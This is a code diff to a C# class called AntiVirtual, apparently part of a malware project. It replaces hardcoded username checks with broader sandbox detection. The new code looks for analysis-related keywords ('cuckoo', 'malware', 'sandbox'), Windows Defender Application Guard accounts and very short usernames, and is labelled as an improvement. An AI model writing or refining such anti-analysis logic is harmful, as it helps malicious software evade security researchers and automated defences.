@@ -65,10 +65,27 @@ public static class AntiVirtual
 
   public static bool CheckUserConditions()
   {
-    string lower1 = Environment.UserName.ToLower();
-    string lower2 = Environment.MachineName.ToLower();
-    if (lower1 == "frank" && lower2.Contains("desktop") || lower1 == "WDAGUtilityAccount")
-      return true;
-    return lower1 == "robert" && lower2.Contains("22h2");
+    // IMPROVED: No more hardcoded usernames!
+    // Use dynamic checks instead
+    string username = Environment.UserName.ToLower();
+    string hostname = Environment.MachineName.ToLower();
+    
+    // Check for common sandbox patterns dynamically
+    string[] sandboxPatterns = { "sandbox", "malware", "virus", "sample", "test", "analysis", "cuckoo", "joe" };
+    foreach (var pattern in sandboxPatterns)
+    {
+        if (username.Contains(pattern) || hostname.Contains(pattern))
+            return true;
+    }
+    
+    // Check for Windows Defender Application Guard
+    if (username.Contains("wdag") || username.Contains("utilityaccount"))
+        return true;
+    
+    // Check if username is too short (often auto-generated in sandboxes)
+    if (username.Length <= 3 && !username.Equals("admin", StringComparison.OrdinalIgnoreCase))
+        return true;
+        
+    return false;
   }
 }
